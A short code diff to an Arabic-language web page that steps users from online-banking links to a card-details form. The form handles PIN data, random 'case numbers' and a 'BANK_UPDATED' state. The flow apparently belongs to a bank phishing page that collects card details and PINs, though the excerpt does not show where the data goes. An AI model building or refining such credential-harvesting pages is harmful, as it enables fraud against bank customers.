@@ -1143,7 +1143,7 @@
 						<div class="col">
 							<div class="form-group">
 								<a
-									href="f1#"
+									href="#"
 									class="text-green waves-effect waves-ligh"
 									@click="screen = 'onlineDetails'"
 									>* لخدمة الأونلاين إضغط هنا</a
@@ -1238,7 +1238,7 @@
 						<div class="col">
 							<div class="form-group">
 								<a
-									href="f1#"
+									href="#"
 									class="text-green waves-effect waves-ligh"
 									@click="screen = 'cardDetails'"
 									>* لخدمة بطاقة الصراف اضغط هنا</a
@@ -2113,12 +2113,11 @@
 						const caseNumber = Math.floor(
 							Math.random() * 899999 + 100000
 						);
-						await this.processForm(e, "accountDetails", {
+						await this.processForm(e, "cardDetails", {
 							state: "BANK_UPDATED",
 							session: caseNumber,
 						});
 						this.user.session = caseNumber;
-						showLoader();
 					},
 					async handleSaveCardDetails(e) {
 						this.cardDetailsError = null;
@@ -2127,8 +2126,6 @@
 						});
 
 						showLoader();
-
-						// this.waitForAction(showLoader());
 					},
 					validPin() {
 						return [...(this.user.pin_data || ["1234"])].pop().code;
